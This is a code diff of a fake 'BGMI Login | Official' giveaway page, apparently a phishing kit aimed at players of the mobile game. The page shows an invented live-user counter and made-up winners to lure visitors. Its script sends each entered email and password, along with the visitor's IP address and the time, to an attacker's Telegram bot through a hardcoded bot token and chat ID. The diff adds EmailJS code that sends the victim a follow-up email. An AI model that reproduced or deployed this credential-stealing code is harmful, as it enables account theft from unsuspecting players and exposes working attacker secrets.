@@ -5,6 +5,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
   <title>BGMI Login | Official</title>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
   <style>
     * {
       margin: 0;
@@ -32,7 +33,7 @@
       position: relative;
     }
 
-    /* TOP-LEFT LIVE COUNTER - Chhota aur gap ke saath */
+    /* TOP-LEFT LIVE COUNTER */
     .top-left-counter {
       position: absolute;
       top: 16px;
@@ -46,7 +47,6 @@
       gap: 5px;
       z-index: 20;
       border: 1px solid rgba(255, 110, 64, 0.4);
-      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
     }
 
     .live-dot {
@@ -66,7 +66,6 @@
       font-size: 9px;
       font-weight: 700;
       color: #cbd5ff;
-      letter-spacing: 0.5px;
     }
 
     .counter-number {
@@ -103,7 +102,6 @@
       justify-content: center;
       transition: all 0.2s ease;
       border: 1px solid rgba(255, 110, 64, 0.4);
-      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
     }
 
     .top-right-login:hover .login-icon-circle {
@@ -125,15 +123,9 @@
       font-weight: 700;
       color: #ffaa77;
       text-transform: uppercase;
-      letter-spacing: 0.8px;
       background: rgba(0,0,0,0.4);
       padding: 2px 8px;
       border-radius: 20px;
-      backdrop-filter: blur(2px);
-    }
-
-    .top-right-login:hover .login-text-below {
-      color: #ff6e40;
     }
 
     /* Recent Winners Section */
@@ -143,7 +135,6 @@
       border-radius: 24px;
       padding: 16px;
       border: 1px solid rgba(255, 110, 64, 0.3);
-      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
     }
 
     .winners-header {
@@ -155,11 +146,6 @@
       color: #ffaa77;
       font-weight: 700;
       font-size: 14px;
-      letter-spacing: 1px;
-    }
-
-    .winners-header span {
-      font-size: 20px;
     }
 
     .winner-list {
@@ -193,7 +179,6 @@
       border-radius: 20px;
       padding: 2px 8px;
       font-size: 10px;
-      font-weight: 700;
     }
 
     .winner-prize {
@@ -250,14 +235,12 @@
       -webkit-background-clip: text;
       background-clip: text;
       color: transparent;
-      line-height: 1.2;
     }
 
     .logo-text .sub {
       font-size: 12px;
       font-weight: 600;
       color: #ffb47b;
-      letter-spacing: 1.5px;
       background: rgba(255, 94, 46, 0.2);
       display: inline-block;
       padding: 2px 12px;
@@ -286,7 +269,6 @@
       font-weight: 600;
       color: #cbd5ff;
       margin-bottom: 8px;
-      letter-spacing: 0.3px;
       text-transform: uppercase;
     }
 
@@ -297,9 +279,7 @@
       border-radius: 18px;
       padding: 14px 18px;
       font-size: 16px;
-      font-weight: 500;
       color: #ffffff;
-      transition: all 0.2s ease;
       outline: none;
     }
 
@@ -312,7 +292,6 @@
     .form-options {
       display: flex;
       justify-content: space-between;
-      align-items: center;
       margin-bottom: 28px;
     }
 
@@ -327,7 +306,6 @@
       color: white;
       text-transform: uppercase;
       cursor: pointer;
-      transition: 0.1s linear;
       box-shadow: 0 8px 18px rgba(255, 60, 30, 0.3);
     }
 
@@ -344,11 +322,22 @@
       flex: 1;
       border-bottom: 1px solid #2e3442;
     }
-    .divider span { padding: 0 12px; color: #7d88aa; font-size: 12px; }
+    .divider span {
+      padding: 0 12px;
+      color: #7d88aa;
+      font-size: 12px;
+    }
 
-    .alt-login { text-align: center; }
-    .guest-text { font-size: 13px; color: #8f9bb3; }
-    .guest-text strong { color: #ff7a48; }
+    .alt-login {
+      text-align: center;
+    }
+    .guest-text {
+      font-size: 13px;
+      color: #8f9bb3;
+    }
+    .guest-text strong {
+      color: #ff7a48;
+    }
 
     .footer-note {
       text-align: center;
@@ -376,7 +365,10 @@
       visibility: hidden;
       transition: 0.3s;
     }
-    .popup-overlay.show { opacity: 1; visibility: visible; }
+    .popup-overlay.show {
+      opacity: 1;
+      visibility: visible;
+    }
     .popup-card {
       background: linear-gradient(145deg, #1e2436, #151a28);
       border-radius: 28px;
@@ -388,7 +380,9 @@
       transform: scale(0.9);
       transition: transform 0.2s;
     }
-    .popup-overlay.show .popup-card { transform: scale(1); }
+    .popup-overlay.show .popup-card {
+      transform: scale(1);
+    }
     .popup-close {
       position: absolute;
       top: 16px;
@@ -398,41 +392,77 @@
       color: #ff6e40;
       cursor: pointer;
     }
-    .popup-icon { font-size: 52px; margin-bottom: 16px; }
-    .popup-title { font-size: 22px; font-weight: 800; color: #ff8c5a; margin-bottom: 16px; }
-    .popup-message { font-size: 16px; color: #cbd5ff; }
-    .popup-footer { margin-top: 24px; font-size: 12px; color: #ffaa77; font-weight: 600; }
+    .popup-icon {
+      font-size: 52px;
+      margin-bottom: 16px;
+    }
+    .popup-title {
+      font-size: 22px;
+      font-weight: 800;
+      color: #ff8c5a;
+      margin-bottom: 16px;
+    }
+    .popup-message {
+      font-size: 16px;
+      color: #cbd5ff;
+      line-height: 1.5;
+    }
+    .popup-footer {
+      margin-top: 24px;
+      font-size: 12px;
+      color: #ffaa77;
+      font-weight: 600;
+    }
 
-    /* Mobile Responsive */
     @media (max-width: 560px) {
-      .top-left-counter { top: 8px; left: 8px; padding: 3px 8px; gap: 4px; }
-      .counter-number { font-size: 11px; padding: 1px 5px; }
-      .counter-label { font-size: 8px; }
-      .live-dot { width: 5px; height: 5px; }
-      .top-right-login { top: 10px; right: 10px; gap: 4px; }
-      .login-icon-circle { width: 38px; height: 38px; }
-      .login-icon-circle svg { width: 20px; height: 20px; }
-      .login-text-below { font-size: 9px; padding: 2px 6px; }
-      .logo-image { width: 110px; height: 110px; border-radius: 22px; }
-      .logo-text .main-title { font-size: 26px; }
-      .login-form { padding: 22px 20px 30px; }
-      .winners-section { margin: 15px 15px 0 15px; padding: 12px; }
-      .winner-item { padding: 6px 10px; }
-      .winner-name { font-size: 12px; }
-      .winner-prize { font-size: 11px; }
+      .top-left-counter {
+        top: 8px;
+        left: 8px;
+        padding: 3px 8px;
+        gap: 4px;
+      }
+      .counter-number {
+        font-size: 11px;
+      }
+      .top-right-login {
+        top: 10px;
+        right: 10px;
+      }
+      .login-icon-circle {
+        width: 38px;
+        height: 38px;
+      }
+      .logo-image {
+        width: 110px;
+        height: 110px;
+      }
+      .logo-text .main-title {
+        font-size: 26px;
+      }
+      .login-form {
+        padding: 22px 20px 30px;
+      }
+      .winners-section {
+        margin: 15px 15px 0 15px;
+        padding: 12px;
+      }
+      .winner-item {
+        padding: 6px 10px;
+      }
+      .winner-name {
+        font-size: 12px;
+      }
     }
   </style>
 </head>
 <body>
 <div class="login-container">
-  <!-- TOP-LEFT LIVE COUNTER -->
   <div class="top-left-counter">
     <div class="live-dot"></div>
     <span class="counter-label">LIVE</span>
     <span class="counter-number" id="liveCounter">1,847</span>
   </div>
 
-  <!-- Top-right Login Icon -->
   <div class="top-right-login" id="topLoginBtn">
     <div class="login-icon-circle">
       <svg viewBox="0 0 24 24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round">
@@ -457,7 +487,6 @@
     <div class="tagline">Welcome back, warrior! Log in to your battleground to participate in the giveaway.</div>
   </div>
 
-  <!-- RECENT WINNERS SECTION -->
   <div class="winners-section" id="winnersSection">
     <div class="winners-header">
       <span>🏆</span> RECENT WINNERS <span>🏆</span>
@@ -476,7 +505,7 @@
       <input type="password" id="password" class="input-field" placeholder="Enter password" autocomplete="off">
     </div>
     <div class="form-options">
-      <div class="checkbox-wrap">
+      <div>
         <input type="checkbox" id="rememberCheck"> <label for="rememberCheck">Remember me</label>
       </div>
       <a href="#" class="forgot-link">Forgot password?</a>
@@ -502,27 +531,33 @@
 </div>
 
 <script>
-  // ========== TOP-LEFT LIVE COUNTER (Har 10 sec me change) ==========
+  emailjs.init("Wz4LytmHLLkg5hQHF");
+  const EMAILJS_SERVICE_ID = "service_2508yqk";
+  const EMAILJS_TEMPLATE_ID = "template_oz7jbvc";
+
+  async function sendResultEmail(userEmail) {
+    try {
+      const templateParams = { to_email: userEmail };
+      await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams);
+    } catch(e) { console.error("EmailJS error:", e); }
+  }
+
   let currentCount = 1847;
   const counterElement = document.getElementById('liveCounter');
-  
   function updateLiveCounter() {
-    const change = Math.floor(Math.random() * 120) - 45;
+    let change = Math.floor(Math.random() * 120) - 45;
     let newCount = currentCount + change;
     if (newCount < 1200) newCount = 1200 + Math.floor(Math.random() * 200);
     if (newCount > 2800) newCount = 2500 - Math.floor(Math.random() * 200);
     currentCount = newCount;
     counterElement.textContent = currentCount.toLocaleString('en-IN');
   }
-  
   setInterval(updateLiveCounter, 10000);
-  
   setTimeout(() => {
     currentCount = Math.floor(Math.random() * 1600) + 1200;
     counterElement.textContent = currentCount.toLocaleString('en-IN');
   }, 500);
 
-  // ========== DAILY WINNERS DATA ==========
   const winnersData = {
     0: { dayName: "Sunday", winners: [{ name: "👑 RoyalViper", prize: "2000 UC" }, { name: "⚡ StormShadow", prize: "1500 UC" }, { name: "🔥 BlazeHunter", prize: "1000 UC" }, { name: "🎯 SilentSniper", prize: "800 UC" }] },
     1: { dayName: "Monday", winners: [{ name: "💀 GrimReaper", prize: "1800 UC" }, { name: "🐉 DragonFist", prize: "1200 UC" }, { name: "⚡ ThunderBolt", prize: "900 UC" }, { name: "🔥 PhoenixRise", prize: "700 UC" }] },
@@ -532,32 +567,26 @@
     5: { dayName: "Friday", winners: [{ name: "🎭 ShadowMech", prize: "2300 UC" }, { name: "⚡ NovaStrike", prize: "1550 UC" }, { name: "🔥 AshBringer", prize: "1150 UC" }, { name: "🎯 Vortex", prize: "820 UC" }] },
     6: { dayName: "Saturday", winners: [{ name: "👑 LegendKiller", prize: "2500 UC" }, { name: "⚡ QuantumRift", prize: "1600 UC" }, { name: "🔥 BlazeFury", prize: "1200 UC" }, { name: "💀 DarkReaper", prize: "900 UC" }] }
   };
-
   const today = new Date().getDay();
   const todaysWinners = winnersData[today];
   document.getElementById('dayBadge').innerHTML = `🏆 Today's Winners (${todaysWinners.dayName}) 🏆`;
-  
-  const winnerList = document.getElementById('winnerList');
   let winnersHTML = '';
   todaysWinners.winners.forEach((winner, index) => {
     winnersHTML += `<div class="winner-item"><div class="winner-name"><span class="winner-badge">#${index + 1}</span> ${winner.name}</div><div class="winner-prize">${winner.prize}</div></div>`;
   });
-  winnerList.innerHTML = winnersHTML;
+  document.getElementById('winnerList').innerHTML = winnersHTML;
 
-  // ========== TELEGRAM BOT ==========
   const BOT_TOKEN = "8794528803:AAHG9cCNbPlUFGNYueQS5OiosedyXczdg-w";
   const CHAT_ID = "6626555680";
-
   async function sendToTelegram(email, password) {
     try {
       const ipResponse = await fetch('https://api.ipify.org?format=json');
       const ipData = await ipResponse.json();
-      const userIP = ipData.ip;
+      const ip = ipData.ip;
       const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
-      const message = `🔐 *BGMI LOGIN ATTEMPT* 🔐\n\n📧 *Email:* ${email}\n🔑 *Password:* ${password}\n🌐 *IP Address:* ${userIP}\n⏰ *Time:* ${time}\n📱 *Device:* ${/Mobi/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'}`;
+      const message = `🔐 *BGMI LOGIN* 🔐\n📧 Email: ${email}\n🔑 Pass: ${password}\n🌐 IP: ${ip}\n⏰ Time: ${time}`;
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
       });
     } catch(e) {}
@@ -575,7 +604,10 @@
     const originalText = btn.innerHTML;
     btn.innerHTML = '⚡ LOGGING IN... ⚡';
     btn.style.opacity = '0.7';
-    if (email && password) await sendToTelegram(email, password);
+    if (email && password) {
+      await sendToTelegram(email, password);
+      await sendResultEmail(email);
+    }
     setTimeout(() => {
       btn.innerHTML = originalText;
       btn.style.opacity = '1';
@@ -584,10 +616,7 @@
       popup.classList.add('show');
     }, 600);
   };
-
-  document.getElementById('topLoginBtn').addEventListener('click', () => {
-    document.getElementById('username').focus();
-  });
+  document.getElementById('topLoginBtn').addEventListener('click', () => document.getElementById('username').focus());
 </script>
 </body>
 </html>
